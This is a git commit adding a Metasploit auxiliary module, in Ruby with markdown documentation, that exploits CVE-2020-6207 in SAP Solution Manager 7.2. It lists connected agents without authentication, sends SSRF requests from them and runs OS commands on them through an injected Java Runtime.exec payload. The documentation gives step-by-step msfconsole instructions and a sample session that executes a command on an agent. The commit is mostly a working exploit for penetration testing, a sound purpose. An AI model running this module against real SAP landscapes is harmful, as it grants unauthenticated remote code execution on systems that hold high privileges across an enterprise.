42726a70c05bfa016860ded6d004318b31cde7a8
Vladimir Ivanov <ivanov.vladimir.mail@gmail.com>
2021-03-21 16:51:21 +0300

    client.rb - library for auxiliary and exploit modules cve_2020_6207_solman_rce.rb - auxiliary module cve_2020_6207_solman_rce.md - documentation for auxiliary module cve_2020_6207_solman_rs.rb - exploit module cve_2020_6207_solman_rs.md - documentation for exploit module

---
+++ documentation/modules/auxiliary/admin/sap/cve_2020_6207_solman_rce.md
@@ -0,0 +1,156 @@
+## Vulnerable Application
+This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
+SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
+checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,
+send HTTP request (SSRF), and execute OS commands on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.
+
+Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected
+to SolMan as a user from which the SMDAgent service starts, usually the daaadm.
+
+Paper: [An Unauthenticated Journey to Root][1]
+
+Solution: [sap note 2890213][2]
+
+### Application Background
+In SAP landscapes, SolMan could be compared to a domain controller system in the Microsoft world.
+It is a technical system that is tightly connected to all other SAP systems with high privileges.
+Once an SAP system is connected to the solution manager, it receives the name of a "managed" or "satellite" system.
+As an administration solution, SolMan is intended to centralize the management of all systems within the landscape by
+performing actions such as implementing, supporting, monitoring and maintaining the enterprise solutions.
+
+### Installation Steps
+Steps to install, configure and manage SolMan can be found online at [this page][3].
+
+Once set up and configured, the instances will be vulnerable on the default HTTP port 50000.
+
+## Verification Steps
+
+1. Start msfconsole
+1. Do: `workspace [WORKSPACE]`
+1. Do: `use auxiliary/admin/sap/sap_2020_6207_solman_rce`
+1. Do: `set RHOSTS [IP]`
+1. Do: `set action LIST`
+1. Do: `run`
+1. Verify that a list of connected agents was returned.
+1. Do: `set AGENT [Connected agent server name]`
+1. Do: `set SSRF_METHOD [GET, POST, PUT, DELETE, PATCH, ...]`
+1. Do: `set SSRF_URI [SSRF uri, example - http://1.1.1.1/test.html]`
+1. Do: `set action SSRF`
+1. Do: `run`
+1. Verify that the HTTP request from the connected agent has been sent.
+1. Do: `set AGENT [Connected agent server name]`
+1. Do: `set COMMAND [OS command, example - ping -c 4 1.1.1.1]`
+1. Do: `set action EXEC`
+1. Do: `run`
+1. Verify that the OS command has been executed on the connected agent.
+
+## Options
+
+### URIPATH
+
+This is the path to the EEM admin page of the SolMan that is vulnerable to CVE-2020-6207.
+By default, it is set to `/EemAdminService/EemAdmin`. However, it can be changed if SolMan
+was installed at a path different from that of the web root. For example, if the SolMan
+server was proxied to the `/solman/` path under the web root, then this value would be
+set to `/solman/EemAdminService/EemAdmin`.
+
+### AGENT
+
+Connected agent sever name.
+Example: `linux_agent`
+
+### SSRF_METHOD
+
+HTTP method for sending HTTP request from a connected agent, the server name of which is specified in the `AGENT` option.
+Example: `GET`
+
+### SSRF_URI
+
+URI for sending HTTP requests from a connected agent, the server name of which is specified in the `AGENT` option.
+Example: `http://1.1.1.1/test.html`
+
+### COMMAND
+
+OS command for executing in connected agent, the server name of which is specified in the `AGENT` option.
+Example: `ping -c 4 1.1.1.1`
+
+## Actions
+```
+   Name  Description
+   ----  -----------
+   EXEC  Exec OS command on connected agent
+   LIST  List connected agents
+   SSRF  Send SSRF from connected agent
+```
+
+## Scenarios
+
+### Vulnerable SolMan 7.2 running on agent: test_linux with OS: Linux and java version: 1.8
+
+```
+msf6 > workspace -a SAP_TEST
+[*] Added workspace: SAP_TEST
+[*] Workspace: SAP_TEST
+msf6 > use auxiliary/admin/sap/cve_2020_6207_solman_rce
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set RHOST 172.16.30.46
+RHOST => 172.16.30.46
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION LIST
+ACTION => LIST
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+[*] Running module against 172.16.30.46
+
+[*] Getting a list of agents connected to the Solution Manager: 172.16.30.46
+[+] Connected agents list:
++--------------+------------------------+---------------+------------------------+--------------+
+| Server Name  | Host Name              | Instance Name | OS Name                | Java Version |
++--------------+------------------------+---------------+------------------------+--------------+
+| test_linux   | SAPERP.corp.test.com   | SMDA98        | Linux                  | 1.8.0_25     |
+| test_windows | SAP731.corp.test.com   | SMDA97        | Windows Server 2008 R2 | 1.6.0_29     |
++--------------+------------------------+---------------+------------------------+--------------+
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
+AGENT => test_linux
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_METHOD PUT
+SSRF_METHOD => PUT
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set SSRF_URI http://192.168.50.2:9999/
+SSRF_URI => http://192.168.50.2:9999/
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set ACTION SSRF
+ACTION => SSRF
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+[*] Running module against 172.16.30.46
+
+[+] Send SSRF: 'PUT http://192.168.50.2:9999/ HTTP/1.1' from agent: test_linux
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set AGENT test_linux
+AGENT => test_linux
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set COMMAND ping -c 4 192.168.50.2
+COMMAND => ping -c 4 192.168.50.2
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > set action EXEC
+action => EXEC
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > run
+[*] Running module against 172.16.30.46
+
+[+] Execution command: 'ping -c 4 192.168.50.2' on agent: test_linux
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > services
+Services
+========
+
+host          port   proto  name  state  info
+----          ----   -----  ----  -----  ----
+172.16.30.46  50000  tcp    soap  open   SAP Solution Manager
+
+msf6 auxiliary(admin/sap/cve_2020_6207_solman_rce) > vulns
+
+Vulnerabilities
+===============
+
+Timestamp                Host          Name                                                            References
+---------                ----          ----                                                            ----------
+2021-03-21 10:31:36 UTC  172.16.30.46  SAP Solution Manager remote unauthorized OS commands execution  CVE-2020-6207,URL-https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf,URL-https://github.com/chipik/SAP_EEM_CVE-2020-6207
+
+```
+
+[1]: https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf
+[2]: https://launchpad.support.sap.com/#/notes/2890213
+[3]: https://blogs.sap.com/2016/02/16/solution-manager-72-installation-and-configuration-i-installations/
---
+++ modules/auxiliary/admin/sap/cve_2020_6207_solman_rce.rb
@@ -0,0 +1,230 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'metasploit/framework/sap_solman/client'
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Exploit::Remote::HttpClient
+  include Metasploit::Framework::SapSolutionManager::Client
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',
+        'License' => MSF_LICENSE,
+        'Author' =>
+          [
+            'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
+            'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability
+            'Dmitry Chastuhin', # @chipik The researcher who made first PoC
+            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
+          ],
+        'Description' => %q{
+          This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
+          SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
+          checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,
+          send HTTP request (SSRF), and execute OS commands on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.
+
+          Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected
+          to SolMan as a user from which the SMDAgent service starts, usually the daaadm.
+        },
+        'References' =>
+          [
+            ['CVE', '2020-6207'],
+            ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],
+            ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']
+          ],
+        'Actions' => [
+          ['LIST', { 'Description' => 'List connected agents' }],
+          ['SSRF', { 'Description' => 'Send SSRF from connected agent' }],
+          ['EXEC', { 'Description' => 'Exec OS command on connected agent' }]
+        ],
+        'DefaultAction' => 'LIST',
+        'DisclosureDate' => '2020-10-03'
+      )
+    )
+    register_options(
+      [
+        Opt::RPORT(50000),
+        OptString.new('URIPATH', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),
+        OptString.new('SSRF_METHOD', [false, 'HTTP method for SSRF', 'GET']),
+        OptString.new('SSRF_URI', [false, 'URI for SSRF', 'http://127.0.0.1:80/']),
+        OptString.new('COMMAND', [false, 'Command for execute in agent', 'id']),
+        OptString.new('AGENT', [false, 'Agent server name for exec command or SSRF', 'agent_server_name']),
+      ]
+    )
+    @@agents = Array.new # Array of connected agents
+  end
+
+  def setup_xml_and_variables
+    @host = datastore['RHOSTS']
+    @port = datastore['RPORT']
+    @path = datastore['URIPATH']
+
+    @agent_name = datastore['AGENT']
+    @script_name = Rex::Text.rand_text_alphanumeric(12)
+
+    if datastore['SSL']
+      @schema = 'https://'
+    else
+      @schema = 'http://'
+    end
+
+    @solman_uri = "#{@schema}#{@host}:#{@port}#{@path}"
+
+    @ssrf_method = datastore['SSRF_METHOD']
+    @ssrf_uri = datastore['SSRF_URI']
+    @ssrf_payload = make_ssrf_payload(@ssrf_method, @ssrf_uri)
+
+    @rce_command = datastore['COMMAND']
+    @rce_payload = make_rce_payload("Packages.java.lang.Runtime.getRuntime().exec('#{@rce_command}').waitFor();")
+  end
+
+  # Analyze runtime error message from SAP Solution Manager client
+  def analyze_error(error_message)
+    case error_message
+    when 'The server not responding'
+      fail_with(Failure::Unreachable, 'The server not responding.')
+    when 'Bad response status code'
+      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response status code not in the expected status code: 200. The target is likely patched.')
+    when 'Response content type is not text/xml'
+      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body not in the expected content type: text/xml. The target is likely patched.')
+    when 'Failed to parse response body'
+      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body not in the expected format. The target is likely patched.')
+    when 'Response body does not contain a SOAP body'
+      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body does not contain a SOAP body. The target is likely patched.')
+    when 'Response body contains errors'
+      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body contains errors.')
+    else
+      fail_with(Failure::UnexpectedReply, 'The server did not respond in the expected manner.')
+    end
+  end
+
+  # Report Service and Vulnerability
+  def report_service_and_vuln
+    report_service(
+      host: @host,
+      port: @port,
+      name: 'soap',
+      proto: 'tcp',
+      info: 'SAP Solution Manager'
+    )
+    report_vuln(
+      host: @host,
+      port: @port,
+      name: name,
+      refs: references
+    )
+  end
+
+  # Check current agent in agents list
+  def check_agent(agent_name)
+    if @@agents.empty?
+      fail_with(Failure::NoTarget, 'Available agents not found, please make agents list: `set action LIST; run`')
+    elsif agent_name.nil?
+      fail_with(Failure::NoTarget, "Please set agent: `set AGENT #{@@agents[0]['serverName']}`")
+    else
+      @@agents.each do |agent|
+        if agent_name == agent[:serverName]
+          return true
+        end
+      end
+    end
+    false
+  end
+
+  def run
+    case action.name
+    when 'LIST'
+      action_list
+    when 'SSRF'
+      action_ssrf
+    when 'EXEC'
+      action_exec
+    else
+      print_error("The action #{action.name} is not a supported action.")
+    end
+  end
+
+  def action_list
+    # Clear agents array if that array is not empty
+    unless @@agents.empty?
+      @@agents.clear
+    end
+    setup_xml_and_variables
+
+    begin
+      print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
+      @@agents = make_agents_array(@path)
+    rescue RuntimeError => e
+      print_error("Failed to make the list of connected agents on the SAP Solution Manager page at #{@solman_uri}")
+      vprint_error("Error #{e.class}: #{e}")
+      analyze_error(e.message)
+    end
+    report_service_and_vuln
+    if @@agents.empty?
+      print_good("Solution Manager server: #{@host}:#{@port} is vulnerable but no agents connected!")
+    else
+      print_good("Connected agents list: \n#{pretty_agents_table(@@agents)}")
+    end
+  end
+
+  def action_ssrf
+    setup_xml_and_variables
+    unless check_agent(@agent_name)
+      fail_with(Failure::NotFound, "Not found agent: #{@agent_name} in connected agents: \n#{pretty_agents_table(@@agents)}")
+    end
+    begin
+      vprint_status("Enable EEM on agent: #{@agent_name}")
+      enable_eem(@agent_name, @path)
+
+      vprint_status("Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}")
+      send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload), @path)
+
+      vprint_status("Stop script: #{@script_name} on agent: #{@agent_name}")
+      stop_script_in_agent(@agent_name, @script_name, @path)
+
+      vprint_status("Delete script: #{@script_name} on agent: #{@agent_name}")
+      delete_script_in_agent(@agent_name, @script_name, @path)
+
+    rescue RuntimeError => e
+      print_error("Failed to send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
+      vprint_error("Error #{e.class}: #{e}")
+      analyze_error(e.message)
+    end
+    report_service_and_vuln
+    print_good("Send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
+  end
+
+  def action_exec
+    setup_xml_and_variables
+    unless check_agent(@agent_name)
+      fail_with(Failure::NotFound, "Not found agent: #{@agent_name} in connected agents: \n#{pretty_agents_table(@@agents)}")
+    end
+    begin
+      vprint_status("Enable EEM on agent: #{@agent_name}")
+      enable_eem(@agent_name, @path)
+
+      vprint_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
+      send_soap_request(make_soap_body(@agent_name, @script_name, @rce_payload), @path)
+
+      vprint_status("Stop script: #{@script_name} on agent: #{@agent_name}")
+      stop_script_in_agent(@agent_name, @script_name, @path)
+
+      vprint_status("Delete script: #{@script_name} on agent: #{@agent_name}")
+      delete_script_in_agent(@agent_name, @script_name, @path)
+
+    rescue RuntimeError => e
+      print_error("Failed to execution command: '#{@rce_command}' on agent: #{@agent_name}")
+      vprint_error("Error #{e.class}: #{e}")
+      analyze_error(e.message)
+    end
+    report_service_and_vuln
+    print_good("Execution command: '#{@rce_command}' on agent: #{@agent_name}")
+  end
+
+end
